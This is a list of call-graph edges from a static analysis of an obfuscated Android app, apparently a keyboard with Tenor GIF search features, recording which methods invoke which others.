SPECIAL edge: specialinvoke r0.<lmo: void <init>(java.util.Comparator)>($r2) in <lqs: void <init>(lkq,java.util.Comparator)> ==> <lmo: void <init>(java.util.Comparator)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r11 = staticinvoke <hny: hny a(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hny: hny a(hmm)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: int[] r()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lsb: boolean hasNext()>
STATIC edge: $r3 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(15) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i1) in <ljd: int b()> ==> <ljd: void A(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorGifSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>($i0, 2) in <izw: int ae(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
STATIC edge: $r2 = staticinvoke <lum: lul g()>() in <lsn: boolean ac()> ==> <lum: lul g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(">") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: int size()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lqr: int size()>
VIRTUAL edge: virtualinvoke r0.<ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>($i0, $r2, $r1, $i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lqd: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.String toHexString(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.lang.Comparable: int compareTo(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lts: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: int b()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int b()>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw f(java.lang.String)> ==> <ivw: ivv I()>
SPECIAL edge: specialinvoke $r24.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_SUGGESTION_METADATA", 24, 24) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $r9 = virtualinvoke $r8.<llo: lma u()>() in <hbv: void j()> ==> <llo: lma u()>
STATIC edge: $i5 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<lqp: void <init>(java.lang.Object[],int,int)>($r2, 0, $i0) in <lqq: lma g()> ==> <lqp: void <init>(java.lang.Object[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqm: java.lang.Object get(int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be greater than size (%s)", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lsb: void <init>(int,int)> ==> <lsa: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void q(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void q(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lkq: int hashCode()>
STATIC edge: staticinvoke <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>($r3, $r3, $i5, $i0, $i4) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<lts: lsz c(int)>($i1) in <lsn: boolean ac()> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_IMAGE", 14, 14) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r0, "<this>") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int min(int,int)>($i2, $i1) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int min(int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r11.<lma: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: int size()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: int size()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int a()>() in <lvq: int size()> ==> <lvq: int a()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(byte[],byte[])>($r4, $r5) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(byte[],byte[])>
SPECIAL edge: specialinvoke $r26.<mag: void <init>(java.lang.String,int,int)>("TENOR_AUTOCOMPLETE_METADATA", 26, 26) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object h(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<gcs: void <init>(hbv,lma,int)>(r0, $r9, 12) in <hbv: void j()> ==> <gcs: void <init>(hbv,lma,int)>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljf: int b()> ==> <iye: void I(boolean,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, 0) in <lvr: void <init>(java.util.List)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalStateException: void <init>(java.lang.String)>("Recursive update") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: $i4 = staticinvoke <izw: int af(int,int)>($i3, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(13) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<qc: void <init>()>() in <ivw: void <clinit>()> ==> <qc: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map o()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<java.lang.String: int compareTo(java.lang.String)>($r2) in <java.lang.String: int compareTo(java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.String)>
INTERFACE edge: $r0 = interfaceinvoke $r2.<lwi: java.lang.StackTraceElement[] b(java.lang.Class,int)>($r1, $i0) in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.lang.Object k(int)>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getKey()>
STATIC edge: staticinvoke <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_period", class "Llst;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: $r5 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: $r10 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r3, $r13) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("extension subtags are out of order: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>($r1) in <lri: void t(java.lang.Object,int)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must be less than size (%s)", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lvr: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r6.<lvs: int compareTo(java.lang.Enum)>($r7) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int compareTo(java.lang.Enum)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lwh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwh: void <clinit>()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lrg: java.util.Iterator iterator()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r4) in <iye: void O(int,int)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ivw: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gsv: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(17) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r5 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] x()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(0) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <ljd: java.util.Iterator l()> ==> <java.util.LinkedHashMap: java.util.Set entrySet()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Flag [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingSearchTermMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: boolean d()>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(11) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(": ") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_Initialized", $r3) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lje: java.lang.Object next()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Error: void <init>()> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljd: void A(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.List: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void q(int)>(3) in <ljd: void <init>()> ==> <ljd: void q(int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(16) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lkm: java.lang.Object a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>($l2, $l3) in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: boolean compareAndSet(long,long)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r2, $r5) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
SPECIAL edge: specialinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>() in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean isEmpty()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lvs: lvs a(java.lang.Object)>($r1) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r5.<lqd: lqd c()>() in <lmb: lme f()> ==> <lqd: lqd c()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: $r3 = interfaceinvoke $r5.<java.util.Iterator: java.lang.Object next()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lid: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean x(char)>
VIRTUAL edge: $r7 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
INTERFACE edge: $z0 = interfaceinvoke $r8.<java.util.Iterator: boolean hasNext()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.a: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/c;", "value") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int size()>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljf: void i(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>($r3, $r4) in <lme: lma d(java.lang.Object)> ==> <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsc: void <init>(lto)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <lri: int b(java.util.Set)> ==> <lsb: boolean hasNext()>
